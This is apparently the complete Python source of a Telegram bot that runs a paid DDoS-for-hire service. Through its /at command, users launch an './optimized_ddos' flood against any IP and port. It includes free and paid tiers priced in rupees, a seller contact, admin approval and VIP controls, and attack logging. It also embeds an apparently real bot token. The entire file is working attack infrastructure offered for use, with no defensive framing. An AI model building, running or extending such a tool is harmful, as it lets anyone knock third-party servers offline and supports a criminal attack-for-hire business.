
import os
import json
import time
import random
import telebot
import subprocess
from datetime import datetime, timedelta

# Initialize bot with your token
TOKEN = '7585657026:AAEMT-G1MDQnsLBLoWP-79QNRo1bIOQReYs'  # Replace with your actual token
bot = telebot.TeleBot(TOKEN)

# Admin ID
ADMIN_ID = 6696347739  # Replace with your actual admin ID

# Initialize necessary directories and files
if not os.path.exists('logs'):
    os.makedirs('logs')

if not os.path.exists('users.txt'):
    with open('users.txt', 'w') as f:
        f.write("USER_ID,USERNAME,NAME,JOIN_DATE,VERIFIED,FEEDBACK_PENDING\n")

if not os.path.exists('attack_logs.txt'):
    with open('attack_logs.txt', 'w') as f:
        f.write("TIMESTAMP,USER_ID,USERNAME,TARGET_IP,TARGET_PORT,DURATION,THREADS\n")

# User state tracking
user_state = {}
attack_processes = {}
attack_cooldowns = {}
feedback_warnings = {}

# ASCII Art for initialization
start_animation = """
Initializing System...  
█████████ 100% [LOADED] ✅  
🔓 Unlocking Secure Gateway...  
█▒▒▒▒▒▒▒▒▒▒▒▒ 10%  
███▒▒▒▒▒▒▒▒▒▒ 30%  
█████▒▒▒▒▒▒▒▒ 50%  
███████▒▒▒▒▒▒ 70%  
█████████▒▒▒▒ 90%  
███████████ 100% ✅  
ACCESS GRANTED 🟢  

🦾 "Welcome, Cyber Warrior! Ready to Dominate the Dos service?"  
🔰 "But First, Verify Yourself…"
"""

# User management functions
def load_users():
    users = {}
    try:
        with open('users.txt', 'r') as f:
            lines = f.readlines()
            for line in lines[1:]:  # Skip header
                if line.strip():
                    parts = line.strip().split(',')
                    if len(parts) >= 6:
                        user_id, username, name, join_date, verified, feedback_pending = parts[:6]
                        users[user_id] = {
                            'username': username,
                            'name': name,
                            'join_date': join_date,
                            'verified': verified.lower() == 'true',
                            'feedback_pending': feedback_pending.lower() == 'true'
                        }
                        # Add additional fields if they exist
                        if len(parts) > 6:
                            users[user_id]['approved'] = parts[6].lower() == 'true'
                        if len(parts) > 7:
                            users[user_id]['vip'] = parts[7].lower() == 'true'
                        if len(parts) > 8:
                            users[user_id]['expiry_date'] = parts[8]
    except Exception as e:
        print(f"Error loading users: {e}")
    return users

def save_users(users):
    try:
        with open('users.txt', 'w') as f:
            f.write("USER_ID,USERNAME,NAME,JOIN_DATE,VERIFIED,FEEDBACK_PENDING,APPROVED,VIP,EXPIRY_DATE\n")
            for user_id, data in users.items():
                f.write(f"{user_id},{data.get('username', 'None')},{data.get('name', 'Unknown')},"
                        f"{data.get('join_date', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))},"
                        f"{str(data.get('verified', False)).lower()},"
                        f"{str(data.get('feedback_pending', False)).lower()},"
                        f"{str(data.get('approved', False)).lower()},"
                        f"{str(data.get('vip', False)).lower()},"
                        f"{data.get('expiry_date', '')}\n")
    except Exception as e:
        print(f"Error saving users: {e}")

def is_user_verified(user_id):
    users = load_users()
    return str(user_id) in users and users[str(user_id)].get('verified', False)

def is_feedback_pending(user_id):
    users = load_users()
    return str(user_id) in users and users[str(user_id)].get('feedback_pending', False)

def is_user_approved(user_id):
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users and users[str_user_id].get('approved', False):
        # Check if expired
        expiry_date = users[str_user_id].get('expiry_date', '')
        if expiry_date:
            try:
                expiry = datetime.strptime(expiry_date, '%Y-%m-%d %H:%M:%S')
                if expiry < datetime.now():
                    users[str_user_id]['approved'] = False
                    save_users(users)
                    return False
            except Exception as e:
                print(f"Error checking expiry: {e}")
        return True
    return False

def is_user_vip(user_id):
    users = load_users()
    return str(user_id) in users and users[str(user_id)].get('vip', False)

def can_user_attack(user_id):
    # User can attack if:
    # 1. User is verified
    # 2. User doesn't have feedback pending OR is approved/VIP
    # 3. User doesn't have an active attack
    
    if not is_user_verified(user_id):
        return False, "❌ You are not verified. Please use /start first."
    
    if is_feedback_pending(user_id) and not (is_user_approved(user_id) or is_user_vip(user_id)):
        return False, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval."
    
    if user_id in attack_processes and attack_processes[user_id]['process'] is not None:
        remaining = int(attack_processes[user_id]['end_time'] - time.time())
        if remaining > 0:
            return False, f"🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You already have an attack running.\n⏳ Time left: {remaining} sec"
    
    return True, ""

# Function to generate CAPTCHA
def generate_captcha():
    return ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(6))

# Function to log attack information
def log_attack(user_id, username, ip, port, time, threads):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Log to attack_logs.txt
    try:
        with open('attack_logs.txt', 'a') as f:
            f.write(f"{timestamp},{user_id},{username},{ip},{port},{time},{threads}\n")
    except Exception as e:
        print(f"Error logging to attack_logs.txt: {e}")
    
    # Log to daily file
    try:
        date_str = datetime.now().strftime("%Y-%m-%d")
        log_file = f"logs/attack_log_{date_str}.txt"
        
        with open(log_file, 'a') as f:
            f.write(f"[{timestamp}] User ID: {user_id} | Username: {username} | Attack: {ip}:{port} | Time: {time}s | Threads: {threads}\n")
    except Exception as e:
        print(f"Error logging to daily file: {e}")
    
    return log_file

# Start command handler
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Send initialization animation with delay
    for i in range(0, len(start_animation), 100):
        bot.send_message(chat_id, start_animation[i:i+100])
        time.sleep(0.5)
    
    # Check if user is already verified
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users and users[str_user_id].get('verified', False):
        bot.send_message(chat_id, "👑 Welcome Back, Cyber Warrior!")
        bot.send_message(chat_id, "Use /help to see available commands.")
        return
    
    # Start verification process
    captcha = generate_captcha()
    user_state[user_id] = {
        'state': 'captcha',
        'captcha': captcha
    }
    
    # Send CAPTCHA to user
    bot.send_message(chat_id, f"🔐 Security Verification Required\n\nPlease enter this code:\n\n{captcha}")

# Handle text messages for verification flow
@bot.message_handler(func=lambda message: message.from_user.id in user_state and user_state[message.from_user.id].get('state') in ['captcha', 'name'])
def handle_verification(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()
    
    # Handle CAPTCHA verification
    if user_state[user_id]['state'] == 'captcha':
        if text == user_state[user_id]['captcha']:
            bot.send_message(chat_id, "✅ Access Code Verified")
            user_state[user_id]['state'] = 'name'
            bot.send_message(chat_id, "💻 Enter Your Hacker Alias:")
        else:
            new_captcha = generate_captcha()
            user_state[user_id]['captcha'] = new_captcha
            bot.send_message(chat_id, f"❌ Invalid Code. Try again:\n\n{new_captcha}")
    
    # Handle name submission
    elif user_state[user_id]['state'] == 'name':
        user_state[user_id]['name'] = text
        user_state[user_id]['state'] = 'terms'
        
        # Save user info
        users = load_users()
        str_user_id = str(user_id)
        
        users[str_user_id] = {
            'username': message.from_user.username or 'None',
            'name': text,
            'join_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'verified': False,
            'feedback_pending': False
        }
        save_users(users)
        
        # Send welcome and terms agreement
        bot.send_message(chat_id, f"⚡ Welcome to the Network, {text}!")
        
        # Notify admin about new user
        admin_msg = f"🔔 New User Registration\nUser ID: {user_id}\nUsername: @{message.from_user.username or 'None'}\nName: {text}"
        bot.send_message(ADMIN_ID, admin_msg)
        
        # Ask for feedback agreement
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(
            telebot.types.InlineKeyboardButton("✅ YES", callback_data="terms_yes"),
            telebot.types.InlineKeyboardButton("❌ NO", callback_data="terms_no")
        )
        
        bot.send_message(
            chat_id, 
            "📝 TERMS OF SERVICE\n\nWill you send feedback (photo) after every attack operation?",
            reply_markup=markup
        )

# Handle terms agreement
@bot.callback_query_handler(func=lambda call: call.data.startswith("terms_"))
def handle_terms(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # Delete the original message
    try:
        bot.delete_message(chat_id, message_id)
    except Exception as e:
        print(f"Error deleting message: {e}")
    
    if call.data == "terms_yes":
        # Update user verification status
        users = load_users()
        str_user_id = str(user_id)
        
        if str_user_id in users:
            users[str_user_id]['verified'] = True
            save_users(users)
        
        # Clean up user state
        if user_id in user_state:
            del user_state[user_id]
        
        # Show help automatically
        bot.send_message(chat_id, "✅ Access Granted! Here are your available commands:")
        help_command(call.message)
        
    elif call.data == "terms_no":
        bot.send_message(chat_id, "⚠ ACCESS DENIED: Get Lost!")
        
        # Clean up user state
        if user_id in user_state:
            del user_state[user_id]

# Help command handler
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    if not is_user_verified(user_id):
        bot.send_message(chat_id, "❌ Access Denied. Use /start to register first.")
        return
    
    # Check for pending feedback
    if is_feedback_pending(user_id) and not (is_user_approved(user_id) or is_user_vip(user_id)):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    help_text = """
✅ Commands Available:
1️⃣ /at <ip> <port> <time> → Free users' attack command.
2️⃣ /report → Send error reports to admin.
3️⃣ /buy → View paid plans & contact admin.
"""
    
    bot.send_message(chat_id, help_text)

# Attack command handler
@bot.message_handler(commands=['at'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user can attack
    can_attack, error_msg = can_user_attack(user_id)
    if not can_attack:
        bot.send_message(chat_id, error_msg)
        return
    
    # Parse command arguments
    parts = message.text.split()
    if len(parts) != 4:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /at <ip> <port> <time>")
        return
    
    _, ip, port_str, time_str = parts
    
    # Validate parameters
    try:
        port = int(port_str)
        attack_time = int(time_str)
        
        # Check if port is valid
        if port < 1 or port > 65535:
            bot.send_message(chat_id, "❌ Invalid port. Must be between 1 and 65535.")
            return
        
        # Check time limits
        if attack_time < 1:
            bot.send_message(chat_id, "❌ Attack time must be at least 1 second.")
            return
    except ValueError:
        bot.send_message(chat_id, "❌ Port and time must be valid numbers.")
        return
    
    # Check cooldown for new IP
    current_time = time.time()
    if user_id in attack_cooldowns:
        last_attack = attack_cooldowns[user_id]
        # If it's a new IP and cooldown is active
        if last_attack['ip'] != ip and current_time - last_attack['time'] < 300:  # 5 minutes (300 seconds)
            remaining = int(300 - (current_time - last_attack['time']))
            bot.send_message(
                chat_id,
                f"🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You must wait **5 minutes** before using a new IP!\n⏳ Time Left: {remaining}s"
            )
            return
    
    # Determine attack time based on IP history
    if user_id in attack_cooldowns and attack_cooldowns[user_id]['ip'] == ip:
        # Same IP+port, limit to 60 seconds
        max_time = 60
    else:
        # New IP+port, allow up to 230 seconds
        max_time = 230
    
    # Enforce time limit
    if attack_time > max_time:
        attack_time = max_time
        bot.send_message(chat_id, f"⚠️ Attack time limited to {max_time} seconds for this target.")
    
    # Set thread count (hidden from user)
    threads = 70
    
    # Log the attack
    log_file = log_attack(user_id, message.from_user.username or "None", ip, port, attack_time, threads)
    
    # Execute attack command
    try:
        cmd = f"./optimized_ddos {ip} {port} {attack_time} {threads}"
        process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Store process info
        attack_processes[user_id] = {
            'process': process,
            'ip': ip,
            'port': port,
            'time': attack_time,
            'start_time': current_time,
            'end_time': current_time + attack_time
        }
        
        # Update attack cooldown
        attack_cooldowns[user_id] = {
            'ip': ip,
            'time': current_time
        }
        
        # Send initial attack message
        attack_msg = bot.send_message(
            chat_id,
            f"🚀 ATTACK LAUNCHED! 🚀\n🎯 **Target:** {ip}:{port}\n⏳ **Time Left:** {attack_time} sec\n⚠ **Do NOT close the bot, attack in progress...**"
        )
        
        # Update countdown
        for i in range(attack_time, 0, -1):
            time.sleep(1)
            try:
                bot.edit_message_text(
                    f"🔥 ATTACK IN PROGRESS 🔥\n⏳ Time Left: {i} sec",
                    chat_id,
                    attack_msg.message_id
                )
            except Exception as e:
                print(f"Error updating countdown: {e}")
            
            # Check if process has exited early
            if process.poll() is not None:
                break
        
        # Clean up process
        if process.poll() is None:  # If still running
            process.terminate()
        
        # Final message
        try:
            bot.edit_message_text(
                f"✅ ATTACK COMPLETED!\n🎯 Target: {ip}:{port}\n⏱️ Duration: {attack_time} sec",
                chat_id,
                attack_msg.message_id
            )
        except Exception as e:
            print(f"Error updating final message: {e}")
            bot.send_message(
                chat_id,
                f"✅ ATTACK COMPLETED!\n🎯 Target: {ip}:{port}\n⏱️ Duration: {attack_time} sec"
            )
        
        # Mark feedback as pending only for free users
        if not (is_user_approved(user_id) or is_user_vip(user_id)):
            users = load_users()
            str_user_id = str(user_id)
            if str_user_id in users:
                users[str_user_id]['feedback_pending'] = True
                save_users(users)
            
            # Send feedback request
            bot.send_message(
                chat_id,
                "📸 Please send a screenshot/photo as feedback from your attack result."
            )
        
        # Clean up from attack_processes
        if user_id in attack_processes:
            attack_processes[user_id]['process'] = None
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ Attack failed: {str(e)}")
        
        # Log error
        with open(log_file, 'a') as f:
            f.write(f"[ERROR] Attack execution failed: {str(e)}\n")

# Report command handler
@bot.message_handler(commands=['report'])
def report_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    if not is_user_verified(user_id):
        bot.send_message(chat_id, "❌ Access Denied. Use /start to register first.")
        return
    
    # Check for pending feedback
    if is_feedback_pending(user_id) and not (is_user_approved(user_id) or is_user_vip(user_id)):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Ask for report details
    bot.send_message(chat_id, "🛠️ Please describe the issue you're experiencing:")
    user_state[user_id] = {'state': 'waiting_report'}

# Buy command handler
@bot.message_handler(commands=['buy'])
def buy_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    if not is_user_verified(user_id):
        bot.send_message(chat_id, "❌ Access Denied. Use /start to register first.")
        return
    
    buy_text = """
✅ Paid users do NOT need to send feedback.
✅ Pricing:

1 Day = ₹10
7 Days = ₹50

✅ Contact Admin: @Mukeshchh999
"""
    
    bot.send_message(chat_id, buy_text)

# Handle feedback photo
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Verify user
    if not is_user_verified(user_id):
        bot.send_message(chat_id, "❌ Access Denied. Use /start to register first.")
        return
    
    # Check if feedback is pending
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users and users[str_user_id].get('feedback_pending', False):
        # Forward the feedback to admin
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        # Add caption for admin
        bot.send_message(
            ADMIN_ID,
            f"📸 Feedback from user:\nID: {user_id}\nName: {users[str_user_id].get('name', 'Unknown')}\nUsername: @{message.from_user.username or 'None'}"
        )
        
        # Mark feedback as received
        users[str_user_id]['feedback_pending'] = False
        save_users(users)
        
        # Clear any feedback warnings
        if user_id in feedback_warnings:
            del feedback_warnings[user_id]
        
        bot.send_message(chat_id, "✅ Thank you for your feedback! You can now use the bot again.")
    else:
        bot.send_message(chat_id, "Thank you for the photo, but no feedback is currently required.")

# Handle report messages
@bot.message_handler(func=lambda message: message.from_user.id in user_state and user_state[message.from_user.id].get('state') == 'waiting_report')
def process_report(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Forward report to admin
    bot.forward_message(ADMIN_ID, chat_id, message.message_id)
    
    # Get user info
    users = load_users()
    str_user_id = str(user_id)
    user_name = users.get(str_user_id, {}).get('name', 'Unknown')
    
    # Add caption for admin
    bot.send_message(
        ADMIN_ID,
        f"📋 Report from user:\nID: {user_id}\nName: {user_name}\nUsername: @{message.from_user.username or 'None'}"
    )
    
    # Clean up state
    if user_id in user_state:
        del user_state[user_id]
    
    bot.send_message(chat_id, "✅ Your report has been sent to the admin. Thank you!")

# Admin commands

# Approve user
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /approve <userid> <days>")
        return
    
    try:
        target_id = parts[1]
        days = int(parts[2])
        
        users = load_users()
        
        if target_id in users:
            # Calculate expiry date
            expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
            
            # Approve user
            users[target_id]['approved'] = True
            users[target_id]['feedback_pending'] = False
            users[target_id]['expiry_date'] = expiry_date
            
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} approved for {days} days.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    f"✅ Your access has been approved for {days} days!"
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Invalid parameters: {str(e)}")

# Disapprove user
@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /disapprove <userid>")
        return
    
    try:
        target_id = parts[1]
        users = load_users()
        
        if target_id in users:
            # Disapprove user
            users[target_id]['approved'] = False
            users[target_id]['vip'] = False
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} has been blocked from using the bot.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    "❌ Your access has been revoked by the admin."
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Invalid parameters: {str(e)}")

# View logs
@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    
    # If no user ID specified, send all logs
    if len(parts) == 1:
        try:
            # Collect all logs
            log_files = [f for f in os.listdir('logs') if f.startswith('attack_log_')]
            
            if not log_files:
                bot.send_message(chat_id, "❌ No log files found.")
                return
            
            # Create a logs summary file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            summary_file = f"logs/logs_summary_{timestamp}.txt"
            
            with open(summary_file, 'w') as f:
                f.write("ATTACK LOGS SUMMARY\n")
                f.write("=" * 70 + "\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 70 + "\n\n")
                
                # Process each log file
                for log_file in sorted(log_files):
                    f.write(f"FILE: {log_file}\n")
                    f.write("-" * 50 + "\n")
                    
                    with open(f"logs/{log_file}", 'r') as log_f:
                        f.write(log_f.read())
                    
                    f.write("\n" + "=" * 70 + "\n\n")
            
            # Send the summary file
            with open(summary_file, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"📋 Complete attack logs summary")
            
            # Clean up
            os.remove(summary_file)
            
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error retrieving logs: {str(e)}")
    else:
        # View logs for specific user
        try:
            target_id = parts[1]
            
            # Collect log entries for this user
            log_entries = []
            log_files = [f for f in os.listdir('logs') if f.startswith('attack_log_')]
            
            for log_file in log_files:
                with open(f"logs/{log_file}", 'r') as log_f:
                    lines = log_f.readlines()
                    for line in lines:
                        if f"User ID: {target_id}" in line:
                            log_entries.append(line.strip())
            
            if log_entries:
                # Create a log file for this user
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                user_log_file = f"logs/user_{target_id}_{timestamp}.txt"
                
                with open(user_log_file, 'w') as f:
                    f.write(f"Attack logs for User ID: {target_id}\n")
                    f.write("-" * 50 + "\n")
                    for entry in log_entries:
                        f.write(entry + "\n")
                
                # Send the log file
                with open(user_log_file, 'rb') as f:
                    bot.send_document(chat_id, f, caption=f"📋 Attack logs for User ID: {target_id}")
                
                # Clean up
                os.remove(user_log_file)
            else:
                bot.send_message(chat_id, f"❌ No logs found for User ID: {target_id}")
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error retrieving logs: {str(e)}")

# Delete logs
@bot.message_handler(commands=['dellogs'])
def delete_logs(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    try:
        # Count log files
        log_files = [f for f in os.listdir('logs') if f.endswith('.txt')]
        file_count = len(log_files)
        
        if file_count == 0:
            bot.send_message(chat_id, "✅ No log files to delete.")
            return
        
        # Create backup of logs before deleting
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = f"logs_backup_{timestamp}.zip"
        
        import zipfile
        with zipfile.ZipFile(backup_file, 'w') as zipf:
            for file in log_files:
                zipf.write(os.path.join('logs', file))
        
        # Send backup to admin
        with open(backup_file, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"📂 Logs backup before deletion - {file_count} files")
        
        # Delete all log files
        for file in log_files:
            os.remove(os.path.join('logs', file))
        
        # Delete backup zip after sending
        os.remove(backup_file)
        
        bot.send_message(chat_id, f"✅ Successfully deleted {file_count} log files. Space has been freed.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error deleting logs: {str(e)}")

# Broadcast message
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    broadcast_text = message.text.replace('/broadcast', '', 1).strip()
    
    if not broadcast_text:
        bot.send_message(chat_id, "❌ Please provide a message to broadcast.")
        return
    
    users = load_users()
    sent_count = 0
    failed_count = 0
    
    status_msg = bot.send_message(chat_id, "⏳ Broadcasting message...")
    
    for user_id_str in users:
        try:
            bot.send_message(int(user_id_str), f"📢 *ANNOUNCEMENT*\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
            
            # Update status every 10 users
            if sent_count % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"⏳ Broadcasting: {sent_count}/{len(users)} sent...",
                        chat_id,
                        status_msg.message_id
                    )
                except:
                    pass
                
        except:
            failed_count += 1
    
    # Final status update
    try:
        bot.edit_message_text(
            f"✅ Broadcast completed:\n• Sent to {sent_count} users\n• Failed: {failed_count} users",
            chat_id,
            status_msg.message_id
        )
    except:
        bot.send_message(
            chat_id,
            f"✅ Broadcast completed:\n• Sent to {sent_count} users\n• Failed: {failed_count} users"
        )

# View users
@bot.message_handler(commands=['view'])
def view_users(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    users = load_users()
    
    # Categorize users
    approved_users = []
    vip_users = []
    free_users = []
    
    for user_id_str, user_data in users.items():
        # Format user info
        username = user_data.get('username', 'None')
        name = user_data.get('name', 'Unknown')
        user_info = f"ID: {user_id_str}, Name: {name}, Username: @{username}"
        
        # Categorize
        if user_data.get('vip', False):
            vip_users.append(user_info)
        elif user_data.get('approved', False):
            # Add expiry info for approved users
            expiry = user_data.get('expiry_date', 'Unknown')
            user_info += f", Expires: {expiry}"
            approved_users.append(user_info)
        else:
            free_users.append(user_info)
    
    # Create a user summary file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    users_file = f"logs/users_summary_{timestamp}.txt"
    
    with open(users_file, 'w') as f:
        f.write("USER SUMMARY\n")
        f.write("=" * 70 + "\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total Users: {len(users)}\n")
        f.write(f"VIP Users: {len(vip_users)}\n")
        f.write(f"Approved Users: {len(approved_users)}\n")
        f.write(f"Free Users: {len(free_users)}\n")
        f.write("=" * 70 + "\n\n")
        
        # List VIP Users
        f.write("VIP USERS\n")
        f.write("-" * 50 + "\n")
        if vip_users:
            for user in vip_users:
                f.write(f"{user}\n")
        else:
            f.write("No VIP users found.\n")
        f.write("\n")
        
        # List Approved Users
        f.write("APPROVED USERS\n")
        f.write("-" * 50 + "\n")
        if approved_users:
            for user in approved_users:
                f.write(f"{user}\n")
        else:
            f.write("No approved users found.\n")
        f.write("\n")
        
        # List Free Users
        f.write("FREE USERS\n")
        f.write("-" * 50 + "\n")
        if free_users:
            for user in free_users:
                f.write(f"{user}\n")
        else:
            f.write("No free users found.\n")
    
    # Send the summary file
    with open(users_file, 'rb') as f:
        bot.send_document(
            chat_id, 
            f, 
            caption=f"👥 User Summary | Total: {len(users)} | VIP: {len(vip_users)} | Approved: {len(approved_users)} | Free: {len(free_users)}"
        )
    
    # Clean up
    os.remove(users_file)

# VIP command
@bot.message_handler(commands=['vip'])
def vip_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if admin
    if user_id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(chat_id, "❌ Incorrect format. Usage: /vip <userid>")
        return
    
    try:
        target_id = parts[1]
        users = load_users()
        
        if target_id in users:
            # Grant VIP access
            users[target_id]['vip'] = True
            users[target_id]['feedback_pending'] = False
            save_users(users)
            
            bot.send_message(chat_id, f"✅ User {target_id} has been granted VIP access.")
            
            # Notify user
            try:
                bot.send_message(
                    int(target_id),
                    "🌟 You have been granted VIP access by the admin!"
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ User not found.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Invalid parameters: {str(e)}")

# Handle all other messages
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # If user has not started the bot, prompt them to start
    if not is_user_verified(user_id):
        bot.send_message(chat_id, "Please use /start to begin.")
        return
    
    # For verified users with pending feedback
    if is_feedback_pending(user_id) and not (is_user_approved(user_id) or is_user_vip(user_id)):
        bot.send_message(chat_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Default response for other messages
    bot.send_message(chat_id, "Use /help to see available commands.")

# Start the bot
if __name__ == "__main__":
    print("Starting Attack System Server...")
    
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Start polling
    bot.polling(none_stop=True)